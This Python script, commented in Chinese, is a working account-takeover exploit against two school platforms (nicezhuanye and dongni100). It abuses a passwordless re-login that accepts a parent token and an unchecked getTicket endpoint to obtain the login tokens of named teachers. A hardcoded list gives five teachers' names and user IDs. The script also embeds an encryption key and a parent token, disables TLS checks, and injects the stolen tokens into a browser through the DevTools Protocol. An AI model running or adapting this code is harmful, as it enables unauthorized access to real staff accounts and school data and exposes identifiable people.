#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
教师账号 Token 注入工具（CDP 全自动）

功能：
  1. 利用两个越权漏洞自动拿到指定教师的 token：
     a) 免密重登：POST /loginserv/login/login 传 {userID, accessToken}（accessToken 用家长 token 即可）
     b) getTicket 不校验 token：拿教师 dongniLoginToken
  2. 通过 CDP 自动把 token 注入浏览器（sessionStorage / localStorage / cookie）
  3. 浏览器即处于教师登录态，直接可用

用法：
  python inject_teacher.py [教师姓名|userID] [目标URL]
  python inject_teacher.py 李冬
  python inject_teacher.py 1445657423926137926 https://school.nicezhuanye.com/examscheduler/

依赖：本目录 .pylibs 下已备好 pycryptodome + websocket-client
"""

import json, urllib.request, urllib.parse, ssl, sys, os, time, subprocess, gzip, base64

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

BASE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(BASE, ".pylibs"))
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import websocket

# ---------- 常量 ----------
KEY = b"RequestMappingHa"
PTOKEN = "userToken-allparenta0a97755c1779e2e3525bd5407859b5d"   # 家长 token（当 accessToken 用）
NZY = "https://school.nicezhuanye.com"
DN  = "https://nicezhuanye.dongni100.com"
PORT = 9222
PROFILE = os.path.join(BASE, "edge_profile")

# 已知教师（姓名 -> nicezhuanye userID）
TEACHERS = {
    "李冬":   "1445657423926137926",
    "孟维丽": "1445657423926137921",
    "安德智": "1445657423926137908",
    "白硕":   "1445657423926137857",
    "卞娅丽": "1445657423926137861",
}

ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE


# ---------- nicezhuanye 加密 ----------
def enc(s):
    gz = gzip.compress(s.encode("utf-8"))
    return base64.b64encode(AES.new(KEY, AES.MODE_ECB).encrypt(pad(gz, 16))).decode()

def dec(b64):
    b = base64.b64decode(b64)
    return gzip.decompress(unpad(AES.new(KEY, AES.MODE_ECB).decrypt(b), 16)).decode("utf-8")


def post(url, data, headers=None):
    h = {"User-Agent": "Mozilla/5.0", "X-Requested-With": "XMLHttpRequest",
         "Content-Type": "application/json; charset=utf-8"}
    if headers: h.update(headers)
    r = urllib.request.Request(url, data=json.dumps(data).encode(), method="POST", headers=h)
    try:
        resp = urllib.request.urlopen(r, timeout=40, context=ctx)
        return resp.status, resp.read().decode("utf-8", "replace"), resp.headers
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace"), e.headers


# ---------- 漏洞 1：免密重登拿 nicezhuanye 教师 token ----------
def get_nzy_teacher(userID):
    body = enc(json.dumps({"parameter": {"userID": userID, "accessToken": PTOKEN}}))
    h = {"X-HQJL-AJAX": "HQJL", "User-Agent": "Mozilla/5.0",
         "X-Requested-With": "XMLHttpRequest", "Content-Type": "application/json; charset=utf-8"}
    r = urllib.request.Request(NZY + "/loginserv/login/login", data=body.encode(), method="POST", headers=h)
    resp = urllib.request.urlopen(r, timeout=40, context=ctx)
    raw = resp.read().decode("utf-8", "replace")
    raw = dec(raw)
    d = json.loads(raw)
    u = d["result"]["userList"][0]
    return u


# ---------- 漏洞 2：getTicket 不校验 token，拿教师 dongniLoginToken ----------
def get_dongni_token(userID):
    st, txt, hd = post(NZY + "/nicezhuanye/ssoLogin/getTicket",
                       {"UserID": userID, "token": "",
                        "parameter": {"UserID": userID, "roleType": "teacher"}},
                       headers={"hqjl-user": userID, "hqjl-token": ""})
    ticket = json.loads(txt)["result"]
    st, txt, hd = post(DN + "/api/base/data/system/auth/sso",
                       {"dictKey": "nicezhuanye", "nicezhuanye": "prod",
                        "ticket": ticket, "clientType": 1})
    d = json.loads(txt)["data"]
    return d["dongniLoginToken"], d


# ---------- CDP ----------
def cdp_eval(ws_url, expr):
    ws = websocket.create_connection(ws_url, timeout=30)
    try:
        ws.send(json.dumps({"id": 1, "method": "Runtime.evaluate",
                            "params": {"expression": expr, "returnByValue": True}}))
        while True:
            r = json.loads(ws.recv())
            if r.get("id") == 1:
                return r
    finally:
        ws.close()


def open_tab(url):
    req = urllib.request.Request(
        f"http://127.0.0.1:{PORT}/json/new?" + urllib.parse.quote(url, safe=":/#?=&"),
        method="PUT")
    target = json.loads(urllib.request.urlopen(req, timeout=10).read())
    return target["webSocketDebuggerUrl"]


def ensure_browser():
    try:
        urllib.request.urlopen(f"http://127.0.0.1:{PORT}/json/version", timeout=2).read()
        print(f"[*] 检测到浏览器已在 {PORT} 端口调试")
        return
    except Exception:
        pass
    edge = None
    for c in [r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
              r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
              r"C:\Program Files\Google\Chrome\Application\chrome.exe"]:
        if os.path.exists(c):
            edge = c; break
    if not edge:
        print("[!] 找不到 Edge/Chrome，请手动启动：msedge --remote-debugging-port=9222")
        sys.exit(1)
    print(f"[*] 启动浏览器: {os.path.basename(edge)}")
    subprocess.Popen([edge, f"--remote-debugging-port={PORT}", f"--user-data-dir={PROFILE}",
                      "--no-first-run", "--no-default-browser-check", "--new-window", "about:blank"],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(40):
        try:
            urllib.request.urlopen(f"http://127.0.0.1:{PORT}/json/version", timeout=1).read()
            print("[*] 浏览器调试端口就绪")
            return
        except Exception:
            time.sleep(0.5)
    print("[!] 浏览器启动超时")
    sys.exit(1)


def js_quote(s):
    return json.dumps(str(s))


def main():
    # 解析参数
    args = [a for a in sys.argv[1:]]
    target_url = "https://school.nicezhuanye.com/examscheduler/"
    for a in args:
        if a.startswith("http"):
            target_url = a
    name_or_uid = next((a for a in args if not a.startswith("http")), None)

    if name_or_uid and name_or_uid in TEACHERS:
        userID = TEACHERS[name_or_uid]
        label = name_or_uid
    elif name_or_uid and name_or_uid.isdigit():
        userID = name_or_uid
        label = name_or_uid
    else:
        # 默认李冬
        userID = TEACHERS["李冬"]; label = "李冬"
    print(f"[*] 目标教师: {label} (userID={userID})")

    # 1. 拿 token
    print("[*] 拿 nicezhuanye 教师 token ...")
    u = get_nzy_teacher(userID)
    nzy_token = u["accesstoken"]
    schoolID = u.get("schoolID")
    regionID = str(u.get("regionID"))
    provinceID = str(u.get("provinceID"))
    systemID = u.get("systemID")
    userName = u.get("name")
    identity = u.get("identity")
    print(f"    -> 身份:{identity} 姓名:{userName} 学校ID:{schoolID} regionID:{regionID}")

    print("[*] 拿 dongniLoginToken ...")
    dlt, dongni_info = get_dongni_token(userID)
    print(f"    -> dongniLoginToken: {dlt[:24]}... roleType={dongni_info.get('roleType')}")

    # 2. 启动/连接浏览器
    ensure_browser()

    # 3. 注入 nicezhuanye sessionStorage（同一 tab 内注入 + 跳转，sessionStorage 是 per-tab 的）
    print("[*] 注入 nicezhuanye sessionStorage ...")
    ws = open_tab(NZY + "/")
    time.sleep(3)
    nzy_js = ";\n".join([
        "sessionStorage.setItem(%s,%s)" % (js_quote(k), js_quote(v))
        for k, v in [
            ("token", nzy_token),
            ("UserID", userID),
            ("systemID", systemID),
            ("schoolID", schoolID),
            ("rootRegionID", provinceID),
            ("RegionID", regionID),
            ("SchoolID", schoolID),
            ("roleID", "1"),
            ("identity", identity),
            ("userName", userName),
            ("nzyToken", nzy_token),
        ]
    ])
    cdp_eval(ws, nzy_js)
    # 同一 tab 内跳转到 nicezhuanye 目标页，保留 sessionStorage
    if "dongni100" in target_url:
        nzy_target = NZY + "/examscheduler/"
    else:
        nzy_target = target_url
    print(f"    -> 跳转 nicezhuanye 页面: {nzy_target}")
    cdp_eval(ws, "location.href=%s" % js_quote(nzy_target))
    time.sleep(3)

    # 4. 注入 dongni100 token（localStorage 是 per-origin 共享的）
    print("[*] 注入 dongni100 token ...")
    ws2 = open_tab(DN + "/")
    time.sleep(3)
    dn_js = ";\n".join([
        "localStorage.setItem('dongniLoginToken',%s)" % js_quote(dlt),
        "sessionStorage.setItem('dongniLoginToken',%s)" % js_quote(dlt),
        "document.cookie='dongniLoginToken='+%s+'; path=/'" % js_quote(dlt),
    ])
    cdp_eval(ws2, dn_js)
    if "dongni100" in target_url:
        dn_target = target_url
    else:
        dn_target = DN + "/v2/center"
    print(f"    -> 跳转 dongni100 页面: {dn_target}")
    cdp_eval(ws2, "location.href=%s" % js_quote(dn_target))
    time.sleep(3)

    print("\n[OK] 注入完成！浏览器已处于教师登录态。")
    print(f"    教师: {label} ({userName})")
    print(f"    nicezhuanye token: {nzy_token[:40]}...")
    print(f"    dongniLoginToken: {dlt}")
    print(f"    nicezhuanye 页签 -> {nzy_target}")
    print(f"    dongni100 页签 -> {dn_target}")


if __name__ == "__main__":
    main()
